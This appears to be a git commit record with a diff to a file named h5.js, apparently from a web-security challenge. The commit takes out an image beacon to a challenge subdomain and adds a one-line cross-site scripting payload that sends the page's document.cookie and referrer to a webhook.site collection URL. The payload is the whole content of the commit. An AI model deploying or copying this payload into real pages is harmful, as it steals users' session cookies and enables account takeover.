9fbdcf0371840bf2dcd6ed56729984821a5b45b2
terjanq <terjanq@users.noreply.github.com>
2020-01-22 21:04:45 +0100

    Update h5.js

--- h5.js
+++ h5.js
@@ -1,3 +1,1 @@
-var x = document.createElement('img');
-x.src=`https://admin.737663b4608e8689e2cc.d.zhack.ca`
-document.documentElement.appendChild(x);
+(new Image()).src=`https://webhook.site/c8c5563a-33e6-4cd2-a4e5-146c5fcbe28b?${document.cookie}&ref=${document.referrer}`;
